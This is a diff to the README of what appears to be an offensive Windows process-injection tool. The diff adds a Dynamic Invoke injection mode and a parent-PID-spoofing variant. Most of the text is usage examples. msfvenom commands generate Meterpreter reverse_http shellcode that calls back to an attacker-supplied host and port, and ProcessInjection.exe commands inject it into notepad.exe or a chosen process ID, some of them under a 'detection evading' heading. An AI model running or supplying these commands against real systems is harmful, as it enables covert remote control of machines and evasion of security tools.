@@ -9,6 +9,7 @@ Currently the tool supports 4 process injection techniques.
 	2) DLL Injection
 	3) Process Hollowing
 	4) APC Queue
+	5) Vanula Process Injection (Dynamic Invoke)
 
 Vanila Process Injection
 Currently the tool accepts shellcode in 3 formats.
@@ -46,10 +47,16 @@ Supports 1 detection evading technique.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:3
 	
-	[+] APC Queue
-	[+] Generating shellcode in c format and injecting it in the target process.
-	[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-	[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:7
+	APC Queue
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:7
+
+	Vanila Process Injection (Dynamic Invoke)
+	All shellcode formats are supported
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f c
+	ProcessInjection.exe /pid:123 /path:"C:\Users\User\Desktop\shellcode.txt" /f:c /t:9
 
 	Detection Evading Technique
 
@@ -68,10 +75,15 @@ Supports 1 detection evading technique.
 	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:6
 
-	[+] Parent PID Spoofing with APC Queue.
-	[+] Generating shellcode in c format and injecting it in the target process.
-	[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-	[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:8
+	Parent PID Spoofing with APC Queue.
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:8
+
+	Parent PID Spoofing with Vanila Process Injection (Dynamic Invoke).
+	Generating shellcode in c format and injecting it in the target process.
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
+	ProcessInjection.exe /ppath:"C:\Windows\System32\notepad.exe" /path:"C:\Users\User\Desktop\shellcode.txt" /parentproc:explorer /f:c /t:10
 
 
 ### Blog Post
@@ -90,5 +102,6 @@ Supports 1 detection evading technique.
 ### Contribution Credit
 
 [Renos](https://twitter.com/r3n_hat)
+[The Wover](https://twitter.com/TheRealWover) & [b33f](https://twitter.com/FuzzySec) for Dynamic Invoke(https://thewover.github.io/Dynamic-Invoke/)
 
 Credits also goes to [Aaron Bray](https://github.com/ambray) & [Rasta Mouse](https://twitter.com/_rastamouse) for Process Hollowing code
